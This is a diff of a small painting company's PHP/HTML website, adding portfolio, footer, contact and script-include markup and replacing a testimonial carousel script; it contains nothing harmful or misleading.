+                           <p>Color Painting Services</p>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xxl-6 col-xl-6 col-lg-6">
+                     <div class="portfolio__item p-relative mb-30">
+                        <div class="portfolio__thumb w-img">
+                           <img src="app/assets/img/portfolio/portfolio-4.jpg" alt="">
 
-    if (totalSlides <= 1) return;
+                           <div class="portfolio__plus transition-3">
+                              <a class="popup-image" href="app/assets/img/portfolio/portfolio-4.jpg">
+                                 <i class="far fa-plus"></i>
+                              </a>
+                           </div>
+                        </div>
+                        <div class="portfolio__content transition-3">
+                           <h3 class="portfolio__title">
+                              <a href="#">Painting Outside In House</a>
+                           </h3>
+                           <p>Color Painting Services</p>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xxl-6 col-xl-6 col-lg-6">
+                     <div class="portfolio__item p-relative mb-30">
+                        <div class="portfolio__thumb w-img">
+                           <img src="app/assets/img/portfolio/portfolio-5.jpg" alt="">
 
-    function updateCarousel() {
-        carousel.style.transform = `translateX(-${currentIndex * 100}%)`;
-        dots.forEach((dot, i) => {
-            dot.classList.toggle('active', i === currentIndex);
-        });
-    }
+                           <div class="portfolio__plus transition-3">
+                              <a class="popup-image" href="app/assets/img/portfolio/portfolio-5.jpg">
+                                 <i class="far fa-plus"></i>
+                              </a>
+                           </div>
+                        </div>
+                        <div class="portfolio__content transition-3">
+                           <h3 class="portfolio__title">
+                              <a href="#">Painting Outside In House</a>
+                           </h3>
+                           <p>Color Painting Services</p>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section> -->
+         <!-- portfolio area end -->
 
-    function nextSlide() {
-        currentIndex = (currentIndex + 1) % totalSlides;
-        updateCarousel();
-    }
+         <!-- video area start -->
+         <!-- <div class="video__area p-relative z-index-11 video-mb--160">
+            <div class="container">
+               <div class="row">
+                  <div class="col-xxl-12">
+                     <div class="video__wrapper video__overlay w-img p-relative">
+                        <img src="app/assets/img/video/video-1.jpg" alt="">
+                        <div class="video__play">
+                           <a href="https://youtu.be/-WRZI63emjs" class="video__play-btn popup-video" target="_blank">
+                              <i class="fas fa-play"></i>
+                           </a>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div> -->
+         <!-- video area end -->
 
-    function startAutoSlide() {
-        autoSlideInterval = setInterval(nextSlide, 6000);
-    }
+      </main>
 
-    function resetAutoSlide() {
-        clearInterval(autoSlideInterval);
-        startAutoSlide();
-    }
+      <!-- footer area start -->
+      <footer>
+        <div class="footer__area black-bg">
+           <div class="footer__top pb-35">
+             <div class="container">
+               <div class="row">
+                 <div class="col-xxl-12">
+                    <div class="brand__wrapper brand__bg ">
+                       <div class="brand__slider swiper-container pt-75 pb-80 black-bg-4">
+                         <div class="swiper-wrapper align-items-center">
+                           <div class="brand__item swiper-slide">
+                             <img src="app/assets/img/brand/Asian.png" alt="">
+                           </div>
+                           <div class="brand__item swiper-slide">
+                             <img src="app/assets/img/brand/Berger.png" alt="">
+                           </div>
+                           <div class="brand__item swiper-slide">
+                             <img src="app/assets/img/brand/Birla.png" alt="">
+                           </div>
+                           <div class="brand__item swiper-slide">
+                             <img src="app/assets/img/brand/Dulux.png" alt="">
+                           </div>
+                           <div class="brand__item swiper-slide">
+                             <img src="app/assets/img/brand/Indigo.png" alt="">
+                           </div>
+                           <div class="brand__item swiper-slide">
+                             <img src="app/assets/img/brand/Nippon.png" alt="">
+                           </div>
+                         </div>
+                       </div>
+                    </div>
+                 </div>
+               </div>
+               <div class="row">
+                  <div class="col-xxl-4 col-xl-4 col-lg-4 col-md-6 col-sm-6">
+                     <div class="footer__widget mb-50">
+                        <div class="footer__widget-top">
+                           <h3 class="footer__widget-title">About Comapny</h3>
+                        </div>
+                        <div class="footer__widget-content">
+                           <div class="footer__widget-about">
+                              <p>At Anbin Vannangal, we believe every wall tells a story — and we make yours a masterpiece. With 20 years of hands-on experience, premium materials, and skilled craftsmanship, we deliver painting and finishing services that are beautiful, durable, and long-lasting.</p>
+                              <div class="footer__logo">
+                                 <a href="index.php">
+                                    <img src="admin/<?php echo $row['logo']; ?>" alt="logo">
+                                 </a>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                   
+                   <div class="col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6">
+                      <div class="footer__widget mb-50">
+                         <div class="footer__widget-top">
+                            <h3 class="footer__widget-title">Contact Us</h3>
+                         </div>
+                         <div class="footer__widget-content ">
+                            <div class="footer__info">
+                              <ul>
+                                 <li class="d-flex align-items-start">
+                                    <div class="footer__info-icon mr-20">
+                                       <i class="fal fa-map-marker-alt"></i>
+                                    </div>
+                                    <div class="footer__info-text">
+                                       <h4>Locations</h4>
+                                       <a target="_blank" href="https://www.google.com/maps/place/Dhaka/@23.7806207,90.3492859,12z/data=!3m1!4b1!4m5!3m4!1s0x3755b8b087026b81:0x8fa563bbdd5904c2!8m2!3d23.8104753!4d90.4119873">
+                                          <?php echo $row['address']; ?><br>
+                                          (Service at Tamil nadu and kerala,Bangalore,Pondicherry)
+                                       </a>
+                                    </div>
+                                 </li>
+                                 <li class="d-flex align-items-start">
+                                    <div class="footer__info-icon mr-20">
+                                       <i class="far fa-envelope-open"></i>
+                                    </div>
+                                    <div class="footer__info-text">
+                                       <h4>Email Us</h4>
+                                       <a href="mailto:<?php echo $row['email']; ?>"><?php echo $row['email']; ?></a>
+                                    </div>
+                                 </li>
+                                 <li class="d-flex align-items-start">
+                                    <div class="footer__info-icon mr-20">
+                                       <i class="fal fa-phone"></i>
+                                    </div>
+                                    <div class="footer__info-text">
+                                       <h4>Phone Us</h4>
+                                       <a href="tel:<?php echo $row['phone']; ?>"><?php echo $row['phone']; ?></a> || 
+                                       <a href="tel:<?php echo $row['phone2']; ?>"><?php echo $row['phone2']; ?></a>
+                                    </div>
+                                 </li>
+                              </ul>
+                           </div>
+                         </div>
+                      </div>
+                   </div>
 
-    window.moveTestimonial = function(direction) {
-        currentIndex = (currentIndex + direction + totalSlides) % totalSlides;
-        updateCarousel();
-        resetAutoSlide();
-    };
+                   <div class="col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6">
+                      <div class="footer__widget mb-50">
+                         <div class="footer__widget-top">
+                            <h3 class="footer__widget-title">Quick Links</h3>
+                         </div>
+                         <div class="footer__widget-content">
+                            <div class="footer__link ml-35">
+                               <ul>
+                                  <li>
+                                     <a href="index.php">Home</a>
+                                  </li>
+                                  <li>
+                                     <a href="app/about.php">About</a>
+                                  </li>
+                                  <li>
+                                     <a href="app/services.php">Services</a>
+                                  </li>
+                                  <li>
+                                     <a href="app/projects.php">Projects</a>
+                                  </li>
+                                  <li>
+                                     <a href="app/contact.php">Contact Us</a>
+                                  </li>
+                               </ul>
+                            </div>
+                         </div>
+                      </div>
+                   </div>
 
-    dots.forEach((dot, index) => {
-        dot.addEventListener('click', () => {
-            currentIndex = index;
-            updateCarousel();
-            resetAutoSlide();
-        });
-    });
+                   <div class="col-xxl-2 col-xl-2 col-lg-5 col-md-6 col-sm-6">
+                      <div class="footer__widget mb-50">
+                         <div class="footer__widget-top">
+                            <h3 class="footer__widget-title">Social Media</h3>
+                         </div>
+                         <div class="footer__widget-content ">
+                           <div class="footer__social">
+                                 <ul>
+                                    <li><a href="https://www.instagram.com/anbinvannangal/" style="background: #fc8459; color: #f8f4ef;"><i class="fab fa-instagram"></i></a></li>
+                                    <li><a href="https://wa.me/918610983642" title="Chat with us on WhatsApp" style="background: #fc8459; color: #f8f4ef;"><i class="fab fa-whatsapp"></i></a></li>
+                                    <li><a href="tel:<?php echo $row['phone']; ?>" title="Call Us" style="background: #fc8459; color: #f8f4ef;"><i class="fal fa-phone"></i></a></li>
+                                 </ul>
+                             </div>
+                         </div>
+                      </div>
+                   </div>
+                   
+                </div>
+             </div>
+           </div>
+           <div class="footer__bottom">
+              <div class="container">
+                 <div class="footer__bottom-border">
+                    <div class="row align-items-center">
+                       <div class="col-xxl-6 col-xl-6 col-lg-6 col-md-6 col-sm-6">
+                          <div class="footer__copyright">
+                              <p>© 2025 <a href="https://anbinvannangal.com/" style="color: #fc8459;"><?php echo $row['title']; ?></a> All Rights Reserved</p>
+                          </div>
+                       </div>
+                       <div class="col-xxl-6 col-xl-6 col-lg-6 col-md-6 col-sm-6">
+                          <div class="footer__copyright text-sm-end">
+                             <p>Design & Developed By <a href="https://www.haptrendmedia.com/" style="color: #fc8459;">Haptrend Media</a> </p>
+                          </div>
+                       </div>
+                    </div>
+                 </div>
+              </div>
+           </div>
+        </div>
+      </footer>
+      <!-- footer area end -->
 
-    startAutoSlide();
+      <!-- JS here -->
+      <script src="app/assets/js/vendor/jquery-3.6.0.min.js"></script>
+      <script src="app/assets/js/vendor/waypoints.min.js"></script>
+      <script src="app/assets/js/bootstrap.bundle.min.js"></script>
+      <script src="app/assets/js/meanmenu.js"></script>
+      <script src="app/assets/js/swiper-bundle.min.js"></script>
+      <script src="app/assets/js/owl.carousel.min.js"></script>
+      <script src="app/assets/js/magnific-popup.min.js"></script>
+      <script src="app/assets/js/parallax.min.js"></script>
+      <script src="app/assets/js/backToTop.js"></script>
+      <script src="app/assets/js/nice-select.min.js"></script>
+      <script src="app/assets/js/counterup.min.js"></script>
+      <script src="app/assets/js/jquery.appear.js"></script>
+      <script src="app/assets/js/jquery.knob.js"></script>
+      <script src="app/assets/js/ajax-form.js"></script>
+      <script src="app/assets/js/wow.min.js"></script>
+      <script src="app/assets/js/isotope.pkgd.min.js"></script>
+      <script src="app/assets/js/imagesloaded.pkgd.min.js"></script>
+      <script src="app/assets/js/main.js"></script>
 
-    const wrapper = document.querySelector('.testimonial-carousel-wrapper');
-    wrapper.addEventListener('mouseenter', () => clearInterval(autoSlideInterval));
-    wrapper.addEventListener('mouseleave', startAutoSlide);
-});
-</script>
+      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+      <script>
+      $(document).on("click", ".view-service", function () {
+          var serviceId = $(this).data("id");
+          $("#service-details").html('<div class="text-center py-5"><div class="spinner-border text-danger" role="status"></div><p class="mt-3">Loading...</p></div>');
+          
+          $.ajax({
+              url: "app/get_service_details.php",
+              type: "POST",
+              data: { id: serviceId },
+              success: function (response) {
+                  $("#service-details").html(response);
+              },
+              error: function () {
+                  $("#service-details").html("<p class='text-danger'>Something went wrong. Please try again later.</p>");
+              }
+          });
+      });
+      </script>
 
-</body>
+      <!-- Floating WhatsApp Button -->
+<a href="https://wa.me/918610983642" target="_blank" id="whatsapp-button" title="Chat with us on WhatsApp">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Chat">
+</a>
+
+   </body>
 </html>
+
